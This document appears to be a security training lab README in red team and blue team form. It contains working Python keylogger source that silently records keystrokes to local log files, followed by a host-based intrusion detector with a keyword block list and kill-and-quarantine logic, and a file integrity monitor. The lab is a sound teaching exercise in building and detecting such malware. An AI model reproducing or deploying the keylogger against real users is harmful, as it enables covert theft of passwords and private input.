## Secplus
#### Step 1: Make a new folder (in downloads folder) and name it SecLab

RED TEAM — Keylogger
```bash
mkdir Keylogger
cd Keylogger
```
#### Create keylogger.py:

```bash
from pynput import keyboard
import os
import logging
from datetime import datetime

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)

# Log file with timestamp
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Capture key strokes
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special: {key}")

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
##### In terminal:

```bash
pip install pynput
python keylogger.py
```
 You’ll see no terminal output — but keypresses will be saved in the logs/ folder.

## BLUE TEAM — HIDS
#### Create HIDS folder

```bash
cd ..
mkdir HIDS
cd HIDS
```
### Create hids.py and paste this code:

```bash
import psutil
import hashlib
import os
import time
import ctypes

# === CONFIG ===
MALICIOUS_KEYWORDS = ["keylogger"]
KNOWN_BAD_HASHES = ["e99a18c428cb38d5f260853678922e03"]  # demo hash
QUARANTINE_FOLDER = "quarantine"
LOG_FILE = "hids_log.txt"

if not os.path.exists(QUARANTINE_FOLDER):
    os.makedirs(QUARANTINE_FOLDER)

# === HELPER FUNCTIONS ===
def hash_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None

def log_alert(message):
    # Terminal + File + Popup
    print(f"\033[91m{message}\033[0m")  # Red color in terminal
    with open(LOG_FILE, "a") as log_file:
        log_file.write(message + "\n")
    ctypes.windll.user32.MessageBoxW(0, message, "Mini HIDS Alert", 1)

# === MAIN FUNCTION ===
def scan_processes():
    for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
        try:
            name = proc.info['name']
            cmd = ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
            exe_path = proc.info['exe']

            # Skip itself
            if name and "hids" in name.lower():
                continue

            # -- Keyword Detection --
            if any(kw in cmd.lower() for kw in MALICIOUS_KEYWORDS):
                alert_msg = (
                    f"[ALERT] Suspicious keyword found!\n"
                    f"Process: {name}\n"
                    f"PID: {proc.info['pid']}\n"
                    f"CMD: {cmd}\n"
                    f"File: {exe_path}"
                )
                log_alert(alert_msg)

                # Safe quarantine
                if exe_path and os.path.exists(exe_path):
                    if "python" in os.path.basename(exe_path).lower():
                        continue  # don't quarantine python.exe

                    proc.kill()
                    quarantine_path = os.path.join(QUARANTINE_FOLDER, os.path.basename(exe_path))
                    os.rename(exe_path, quarantine_path)
                    log_alert(f"[X] Quarantined: {exe_path}")

            # -- Hash Detection --
            if exe_path and os.path.exists(exe_path):
                file_hash = hash_file(exe_path)
                if file_hash in KNOWN_BAD_HASHES:
                    alert_msg = (
                        f"[ALERT] Malicious hash match!\n"
                        f"Process: {name}\n"
                        f"PID: {proc.info['pid']}\n"
                        f"Hash: {file_hash}\n"
                        f"File: {exe_path}"
                    )
                    log_alert(alert_msg)

                    proc.kill()
                    quarantine_path = os.path.join(QUARANTINE_FOLDER, os.path.basename(exe_path))
                    os.rename(exe_path, quarantine_path)
                    log_alert(f"[X] Quarantined by hash: {exe_path}")

        except Exception:
            continue
# === ENTRY POINT ===
if __name__ == "__main__":
    print("== Mini Host-Based IDS Started ==")
    scan_processes()

```
### Install module
```bash
pip install psutil
```
### Run HIDS
```bash
python hids.py
```
This script will:
Scan all running processes.
Alert (popup + red text) if a suspicious command is found (e.g., includes keylogger).
Kill the process and move it to a quarantine/ folder.
You can test this by running keylogger.py in one terminal, and then hids.py in another.

### BLUE TEAM — File Integrity Monitoring (FIM)
```bash
cd ..
mkdir FIM
cd FIM
mkdir logs protected_files
```
#### Create fim.py and paste your code.
```bash
import os, hashlib, time
from datetime import datetime

MONITOR_DIR = "protected_files"
HASH_DB = "logs/fim_hashes.txt"
ALERT_LOG = "logs/fim_alerts.txt"

os.makedirs("logs", exist_ok=True)
os.makedirs(MONITOR_DIR, exist_ok=True)

def get_hash(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None

def load_hashes():
    if not os.path.exists(HASH_DB): return {}
    with open(HASH_DB) as f:
        return dict(line.strip().split(" || ") for line in f)

def save_hashes(hashes):
    with open(HASH_DB, 'w') as f:
        for path, h in hashes.items():
            f.write(f"{path} || {h}\n")

def log_alert(msg):
    with open(ALERT_LOG, 'a') as f:
        f.write(f"[{datetime.now()}] {msg}\n")
    print(f"[ALERT] {msg}")

while True:
    previous_hashes = load_hashes()
    current_hashes = {}

    for root, _, files in os.walk(MONITOR_DIR):
        for file in files:
            path = os.path.join(root, file)
            h = get_hash(path)
            if h:
                current_hashes[path] = h

    for path in previous_hashes:
        if path not in current_hashes:
            log_alert(f"Deleted: {path}")
        elif current_hashes[path] != previous_hashes[path]:
            log_alert(f"Modified: {path}")

    for path in current_hashes:
        if path not in previous_hashes:
            log_alert(f"New file added: {path}")

    save_hashes(current_hashes)
    time.sleep(5)
```
#### Run:
```bash
python fim.py
```
